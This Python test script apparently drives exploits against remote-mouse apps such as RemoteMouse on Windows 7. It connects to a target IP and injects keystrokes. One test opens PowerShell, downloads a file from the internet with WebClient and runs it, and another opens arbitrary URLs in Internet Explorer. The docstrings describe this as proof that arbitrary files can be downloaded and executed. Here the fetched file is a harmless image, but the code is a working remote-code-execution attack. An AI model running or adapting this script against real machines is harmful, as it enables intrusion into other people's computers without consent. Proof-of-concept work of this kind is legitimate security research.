import sys
from time import sleep

## Change this line to use a different driver
## Format is from <folder_name>.<app_name>_driver import <driver_name> as current_driver
##from WiFiMouse.wifimouse_driver import WiFiMouseDriver as current_driver
from RemoteMouse.remote_mouse_driver import RemoteMouseDriver as current_driver
#from AirHID.airhid_driver import AirHidDriver as current_driver
IP = '192.168.107.130'

"""
Tests the exploit driver by:
    - opening the Windows start menu
    - opening Yahoo in the primary web browser

The tests are meant to be run on Windows 7.

When running the test, you can specify the IP address of the system to be
exploited as the first command-line parameter.
"""

def main():
    if len(sys.argv) >= 2:
        ip = sys.argv[1]
    else:
        ip = IP

    r = current_driver(ip)

    tests = [test_powershell,
             test_open_url]

    for run in tests:
        clean_environment(r)
        run(r)
        sleep(10)

    r.close()

def clean_environment(r):
    r.move_mouse(-2000,-2000)

"""
Demonstrates that we can both open an arbitrary page in the default browser and
use the browser itself by navigating to another page. F4 shortcut is IE-specific.
"""
def test_open_url(r):
    open_url("http://www.yahoo.com/", r)
    sleep(10)
    r.press_action_key("F4")
    sleep(1)
    r.typeText("www.google.com") \
     .press_action_key('ENTER')

"""
Demonstrates that we can download an arbitrary file from the Internet and
execute it.
"""
def test_powershell(r):
    r.move_mouse(-2000,2000).left_click()
    sleep(0.5)
    r.typeText('powershell')
    r.press_action_key('ENTER')
    sleep(4)
    r.typeText('$c = new-object System.Net.WebClient') \
     .press_action_key('ENTER') \
     .typeText('$c.DownloadFile("http://mit.edu/img/BackImage.jpg","Desktop\\BackImage.jpg")') \
     .press_action_key('ENTER')
    sleep(5)
    r.typeText('.\\Desktop\\BackImage.jpg') \
     .press_action_key('ENTER')

def test_ping(r):
    r.left_click()
    sleep(10)

def open_url(website, r):
    r.move_mouse(-2000,2000).left_click()
    sleep(0.5)
    r.typeText('Internet Explorer') \
     .press_action_key("ENTER")
    sleep(10)
    r.press_action_key("F4")
    sleep(1)
    r.typeText(website) \
     .press_action_key("ENTER")

if __name__ == "__main__":
    main()
